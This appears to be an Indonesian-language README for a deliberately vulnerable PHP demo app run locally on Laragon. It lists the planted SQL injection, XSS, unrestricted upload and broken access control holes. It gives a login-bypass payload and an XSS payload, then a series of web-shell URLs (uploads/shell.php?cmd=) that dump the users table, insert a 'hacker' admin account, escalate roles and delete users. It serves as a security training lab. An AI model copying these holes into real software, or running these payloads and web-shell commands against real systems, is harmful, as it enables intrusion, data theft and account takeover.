##  Kerentanan yang Diimplementasikan:
1. SQL Injection (login.php)

Exploit: 
```bash ' OR '1'='1 ``` 
pada username/password
Bypass login tanpa kredensial valid

2. Cross-Site Scripting (XSS) (vulnerable.php)

Exploit: 
```bash <script>alert('XSS')</script> ``` 
HTML/JavaScript dieksekusi langsung

3. File Upload Vulnerability (vulnerable.php)

Tidak ada validasi tipe file
Bisa upload .php, .exe, dll

4. Broken Access Control (vulnerable.php)

Semua user bisa akses panel admin
Tidak ada pengecekan role

## Format Path MySQL:
Untuk MySQL :
C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe
## Test Security Demo Database
```bash# Show tables
mysql.exe -u root -e "USE security_demo; SHOW TABLES;"```

# Show users
```mysql.exe -u root -e "SELECT * FROM security_demo.users;"```
## Insert Test User
```mysql.exe -u root -e "INSERT INTO security_demo.users (username, password, email, role) VALUES ('test2', 'test123', 'test2@demo.com', 'user');"```

## RCE Exploit Commands untuk Laragon
```http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "SHOW DATABASES;"```
 ## Show Tables
```http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "USE security_demo; SHOW TABLES;"```
## Select Users
```http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "SELECT * FROM security_demo.users;"```
## Insert Hacker Account
```http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "INSERT INTO security_demo.users (username, password, email, role) VALUES ('hacker', 'hack123', 'hacker@evil.com', 'admin');"```
##  Update User to Admin
```http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "UPDATE security_demo.users SET role='admin' WHERE username='user';"```
## Delet User
```http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "DELETE FROM security_demo.users WHERE username='hacker';"```
